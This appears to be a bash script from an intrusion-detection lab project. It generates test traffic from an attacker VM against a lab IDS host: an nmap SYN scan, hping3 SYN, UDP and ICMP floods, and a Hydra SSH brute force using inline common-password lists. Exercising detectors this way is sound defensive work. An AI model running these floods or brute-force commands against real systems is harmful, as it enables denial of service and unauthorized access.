#!/bin/bash
# ============================================================
# simulate_attacks.sh
# Run this on the ATTACKER VM to simulate attacks against
# the MAIN VM (IDS host). Used to test live detection.
#
# USAGE:
#   chmod +x scripts/simulate_attacks.sh
#   ./scripts/simulate_attacks.sh <TARGET_IP>
#
# Example:
#   ./scripts/simulate_attacks.sh 192.168.64.2
# ============================================================

TARGET_IP="${1:-192.168.64.2}"    # replace with your main VM's IP
DELAY=3                           # seconds between attack types

echo "============================================"
echo " IDS Attack Simulation"
echo " Target: $TARGET_IP"
echo " WARNING: Only run in your private lab VMs!"
echo "============================================"

# ── Install tools on attacker VM ─────────────────────────
echo "[SETUP] Installing attack tools..."
sudo apt update -y -qq
sudo apt install -y nmap hping3 hydra netcat-openbsd > /dev/null 2>&1

# ── 1. Port Scan (nmap) ──────────────────────────────────
echo ""
echo "[ATTACK 1] Port Scan — nmap SYN scan..."
nmap -sS -T4 -p 1-1000 "$TARGET_IP" -oN logs/portscan_results.txt
echo "Port scan complete. Results in logs/portscan_results.txt"
sleep "$DELAY"

# ── 2. SYN Flood / DDoS simulation (hping3) ─────────────
echo ""
echo "[ATTACK 2] SYN Flood (15 seconds)..."
echo "  hping3 → SYN packets to port 80 on $TARGET_IP"
timeout 15 hping3 -S -p 80 --flood "$TARGET_IP" || true
echo "SYN flood complete."
sleep "$DELAY"

# ── 3. SSH Brute Force (Hydra with common passwords) ────
echo ""
echo "[ATTACK 3] SSH Brute Force simulation (Hydra)..."
# Uses a tiny wordlist — for lab demo only
cat > /tmp/lab_users.txt << 'EOF'
root
admin
ubuntu
user
bella
EOF
cat > /tmp/lab_passwords.txt << 'EOF'
password
123456
admin
ubuntu
test
qwerty
letmein
EOF
hydra -L /tmp/lab_users.txt -P /tmp/lab_passwords.txt \
      ssh://"$TARGET_IP" -t 4 -V -f 2>/dev/null | tail -20 || true
echo "SSH brute force simulation complete."
sleep "$DELAY"

# ── 4. UDP Flood ─────────────────────────────────────────
echo ""
echo "[ATTACK 4] UDP Flood (10 seconds)..."
timeout 10 hping3 --udp -p 53 --flood "$TARGET_IP" || true
echo "UDP flood complete."
sleep "$DELAY"

# ── 5. ICMP Flood (ping flood) ───────────────────────────
echo ""
echo "[ATTACK 5] ICMP Flood (10 seconds)..."
timeout 10 sudo hping3 --icmp --flood "$TARGET_IP" || true
echo "ICMP flood complete."

echo ""
echo "============================================"
echo " All attacks complete."
echo " Check Kibana at http://$TARGET_IP:5601"
echo " for detected alerts."
echo " And the IDS dashboard at http://$TARGET_IP:8000"
echo "============================================"
